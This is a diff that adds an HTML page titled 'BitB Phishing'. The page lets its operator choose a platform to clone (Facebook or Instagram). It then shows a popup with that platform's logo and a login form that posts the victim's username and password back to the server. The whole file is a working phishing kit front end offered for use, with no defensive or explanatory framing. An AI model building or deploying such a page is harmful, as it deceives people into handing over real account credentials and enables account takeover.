@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>BitB Phishing</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #f9f9f9;
+      margin-top: 100px;
+    }
+    .popup {
+      display: none;
+      background: white;
+      width: 350px;
+      padding: 20px;
+      border: 1px solid #ccc;
+      margin: auto;
+      box-shadow: 0 0 10px rgba(0,0,0,0.3);
+    }
+    .popup img {
+      width: 120px;
+      margin-bottom: 20px;
+    }
+    .popup input, .popup button {
+      width: 90%;
+      padding: 10px;
+      margin: 8px 0;
+      font-size: 16px;
+    }
+  </style>
+</head>
+<body>
+
+  <h2>🔒 Select which platform to clone:</h2>
+  <button onclick="showPopup('facebook')">Facebook</button>
+  <button onclick="showPopup('instagram')">Instagram</button>
+
+  <div id="popup" class="popup">
+    <img id="popupLogo" src="" alt="Platform Logo">
+    <form method="POST">
+      <input type="text" name="email" placeholder="Email or Username" required>
+      <input type="password" name="password" placeholder="Password" required>
+      <button type="submit">Login</button>
+    </form>
+  </div>
+
+  <script>
+    function showPopup(platform) {
+      let logo = '';
+      if (platform === 'facebook') {
+        logo = '/facebook.png';
+      } else if (platform === 'instagram') {
+        logo = '/instagram.png';
+      }
+      document.getElementById('popupLogo').src = logo;
+      document.getElementById('popup').style.display = 'block';
+    }
+  </script>
+
+</body>
+</html>
+
